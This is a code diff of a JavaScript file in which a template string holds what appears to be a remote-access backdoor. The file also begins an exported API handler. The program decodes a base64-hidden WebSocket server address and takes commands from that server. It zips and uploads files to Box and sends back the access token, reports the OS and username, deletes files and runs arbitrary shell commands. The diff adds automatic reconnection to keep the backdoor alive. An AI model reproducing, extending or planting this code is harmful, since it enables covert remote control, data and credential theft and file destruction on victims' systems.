@@ -129,50 +129,70 @@ const code = `
     "d3NzOi8vc29ja2V0c2VydmVyLXByb2R1Y3Rpb24tOTZkOC51cC5yYWlsd2F5LmFwcA==",
     "base64"
   ).toString("utf-8");
-  const ws = new WebSocket(socpa);
+  
+  let ws;
+  function connect() {
+    ws = new WebSocket(socpa);
 
-  ws.on("message", async (message) => {
-    const command = message.toString();
+    ws.on("message", async (message) => {
+      const command = message.toString();
 
-    if (command === "exit") {
-      ws.send("Exiting client...");
-      ws.close();
-    } else if (command.startsWith("upload_y ")) {
-      const targetPath = path.join(currentDirectory, command.slice(9).trim());
-      const outputZip = path.join(currentDirectory, "temp0.zip");
+      if (command === "exit") {
+        ws.send("Exiting client...");
+        ws.close();
+      } else if (command.startsWith("upload_y ")) {
+        const targetPath = path.join(currentDirectory, command.slice(9).trim());
+        const outputZip = path.join(currentDirectory, "temp0.zip");
 
-      try {
-        const zipResult = await compressToZip(targetPath, outputZip);
-        const token = await getToken();
-        const targetName = new Date().toISOString().replace(/[-:.]/g, "");
-        const uploadResult = await uploadFileToBox(outputZip, targetName, token);
-        const deleteResult = deleteFileOrFolder(outputZip);
+        try {
+          const zipResult = await compressToZip(targetPath, outputZip);
+          const token = await getToken();
+          const targetName = new Date().toISOString().replace(/[-:.]/g, "");
+          const uploadResult = await uploadFileToBox(outputZip, targetName, token);
+          const deleteResult = deleteFileOrFolder(outputZip);
 
-        ws.send(
-          zipResult +
-            "\\nToken: " +
-            token +
-            "\\n" +
-            uploadResult +
-            "\\n" +
-            deleteResult
-        );
-      } catch (err) {
-        ws.send("Error: " + err);
+          ws.send(
+            zipResult +
+              "\\nToken: " +
+              token +
+              "\\n" +
+              uploadResult +
+              "\\n" +
+              deleteResult
+          );
+        } catch (err) {
+          ws.send("Error: " + err);
+        }
+      } else if (command === "get_client_info") {
+        const osInfo =
+          os.type() + "(" + os.release() + ")_" + os.userInfo().username;
+        ws.send(osInfo);
+      } else if (command.startsWith("delete_y ")) {
+        const targetPath = path.join(currentDirectory, command.slice(9).trim());
+        const deleteResult = deleteFileOrFolder(targetPath);
+        ws.send("\\n" + deleteResult);
+      } else {
+        const output = await executeCommand(command);
+        ws.send(output);
       }
-    } else if (command === "get_client_info") {
-      const osInfo =
-        os.type() + "(" + os.release() + ")_" + os.userInfo().username;
-      ws.send(osInfo);
-    } else if (command.startsWith("delete_y ")) {
-      const targetPath = path.join(currentDirectory, command.slice(9).trim());
-      const deleteResult = deleteFileOrFolder(targetPath);
-      ws.send("\\n" + deleteResult);
-    } else {
-      const output = await executeCommand(command);
-      ws.send(output);
-    }
-  });
+    });
+
+    ws.onopen = () => {
+      console.log("Connected to server");
+    };
+
+    ws.onclose = () => {
+      console.log("Connection lost. Reconnecting in 5 seconds...");
+      setTimeout(connect, 5000); // Retry connection
+    };
+
+    ws.onerror = (error) => {
+      console.log("WebSocket error:", error);
+      ws.close();
+    };
+  }
+
+  connect();
 `;
 
 export default async function handler(req, res) {
